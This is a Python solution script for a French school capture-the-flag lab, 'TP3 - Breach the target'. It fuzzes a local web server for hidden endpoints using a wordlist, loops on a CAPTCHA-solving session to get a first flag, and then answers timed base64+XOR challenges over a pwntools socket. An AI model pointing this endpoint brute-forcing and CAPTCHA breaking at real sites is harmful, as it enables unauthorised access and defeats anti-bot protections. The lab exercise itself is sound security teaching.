"""TP3 - Breach the target (squelette).

Enchaîne une phase web (fuzzing + CAPTCHA) et une phase réseau (décodage
chronométré). Voir tp3-breach-the-target.md.

    poetry run tp3 --target http://127.0.0.1:8080
"""

import argparse
import requests
import base64
import re
from pathlib import Path
from pwn import remote, context
from tp3.utils.session import Session
from tp3.utils.config import logger


def breach_web(target: str) -> tuple[str, int, bytes]:
    """Fuzz les endpoints, casse le CAPTCHA, retourne (host, port, key).

    Affiche aussi Flag 1. Indices : requests, PIL, pytesseract.
    """
    wordlist_path = Path(__file__).parent / "wordlist.txt"
    hidden_url = ""

    with open(wordlist_path, "r") as f:
        for word in f.read().splitlines():
            test_url = f"{target}/{word}"
            try:
                req = requests.get(test_url)
                if req.status_code == 200:
                    hidden_url = test_url
                    logger.info(f"Hidden page found at: {hidden_url}")
                    break
            except requests.exceptions.RequestException:
                continue

    if not hidden_url:
        raise ValueError("Hidden endpoint not found.")

    while True:
        session = Session(hidden_url)
        session.prepare_request()
        session.submit_request()
        session.process_response()

        flag1 = session.get_flag()
        if flag1:
            logger.info(f"[+] FLAG1: {flag1}")
            return session.tcp_host, session.tcp_port, session.tcp_key
        else:
            logger.info("[-] Retrying CAPTCHA...")


def breach_network(host: str, port: int, key: bytes) -> str:
    """pwntools/socket : décode le flux base64+XOR en boucle sous 30 s.

    Retourne le flag final. Indices : pwn.remote, base64.
    """
    context.log_level = "error"

    conn = remote(host, port)

    while True:
        try:
            line = conn.recvline().decode("utf-8").strip()

            if "ESGI{" in line:
                match = re.search(r"ESGI\{.*?\}", line)
                return match.group(0) if match else "ESGI{not_found}"

            if not line or " " in line or line == "WRONG":
                continue

            try:
                raw_data = base64.b64decode(line)
                decoded_data = bytearray()
                for i in range(len(raw_data)):
                    octet_xor = raw_data[i] ^ key[i % len(key)]
                    decoded_data.append(octet_xor)
                decoded_data = bytes(decoded_data)
                conn.sendline(decoded_data)
            except Exception as e:
                logger.warning(f"DEBUG - Impossible de décoder en base64 : {e}")

        except EOFError:
            break

    return "ESGI{tcp_connection_lost}"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:8080")
    args = ap.parse_args()

    logger.info("Starting TP3 - breach the target")
    host, port, key = breach_web(args.target)
    flag = breach_network(host, port, key)
    logger.info(f"[+] FLAG_FINAL: {flag}")


if __name__ == "__main__":
    main()
